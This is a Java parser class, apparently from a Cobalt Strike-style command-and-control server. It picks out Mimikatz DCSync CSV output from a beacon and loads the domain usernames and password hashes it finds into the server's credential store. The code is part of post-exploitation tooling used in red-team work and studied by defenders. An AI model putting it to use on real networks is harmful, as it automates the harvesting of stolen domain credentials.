package parser;

import common.BeaconEntry;
import common.CommonUtils;
import common.RegexParser;
import server.Resources;
import server.ServerUtils;

public class MimikatzDcSyncCSV extends Parser {
    public MimikatzDcSyncCSV(Resources resources) {
        super(resources);
    }

    public boolean check(String string, int n) {
        return (isOutput(n) && string.indexOf("will be the domain") > 0 && string.indexOf("will be the DC server") > 0 && string.indexOf("Exporting domain") > 0);
    }

    public void parse(String string1, String string2) throws Exception {
        BeaconEntry beaconEntry = ServerUtils.getBeacon(this.resources, string2);
        if (beaconEntry == null)
            return;
        String str = beaconEntry.getComputer();
        string1 = CommonUtils.strrep(string1, "\r", "");
        String[] arrstring = string1.split("\n");
        for (byte b = 0; b < arrstring.length; b++) {
            String str1 = arrstring[b];
            if (str1.endsWith("' will be the domain")) {
                RegexParser regexParser = new RegexParser(str1);
                if (regexParser.matches(".*? '(.*?)' will be the domain"))
                    str = regexParser.group(1);
            }
            String[] strs1 = str1.split("\t");
            if (strs1.length == 3 && CommonUtils.isNumber(strs1[0]) && !strs1[1].endsWith("$"))
                ServerUtils.addCredential(this.resources, strs1[1], strs1[2], str, "mimikatz", beaconEntry.getInternal());
        }
        this.resources.call("credentials.push");
    }
}
